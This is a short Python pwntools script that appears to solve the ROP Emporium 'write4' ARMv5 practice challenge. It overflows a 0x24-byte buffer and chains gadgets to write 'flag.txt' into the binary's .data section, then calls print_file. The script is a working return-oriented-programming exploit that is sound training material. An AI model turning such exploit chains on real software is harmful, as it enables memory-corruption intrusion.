#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import time

# Set up pwntools for the correct architecture
elf = context.binary = ELF('write4_armv5')

# 164 : read
# 176 : ret
gs='''
b *pwnme+176
'''

# pop {r3, r4, pc}
g_pop_r3r4 = 0x000105f0          

# str r3, [r4] ; pop {r3, r4, pc}
g_str_r3r4 = 0x000105ec

# pop {r0, pc}
g_pop_r0 = 0x000105f4

if len(sys.argv)>1 and sys.argv[1] == "-d":
    io = gdb.debug([elf.path],gdbscript=gs)
else:
    io = process([elf.path])

data = elf.get_section_by_name('.data').header['sh_addr']
print_file = elf.plt['print_file']
main=elf.symbols['main']

log.info(f".data       = 0x{data}")
log.info(f".print_file = 0x{print_file}")

io.recvuntil(b"> ")


offset=0x24

flagfile=b"flag.txt"

PL=b"A"*offset
PL+=p32(g_pop_r3r4)
PL+=flagfile[:4]
PL+=p32(data)
PL+=p32(g_str_r3r4)
PL+=flagfile[4:8]
PL+=p32(data+4)
PL+=p32(g_str_r3r4)
PL+=p32(0)
PL+=p32(0)
PL+=p32(g_pop_r0)
PL+=p32(data)
PL+=p32(print_file)
PL+=p32(main)


io.sendline(PL)
io.interactive()

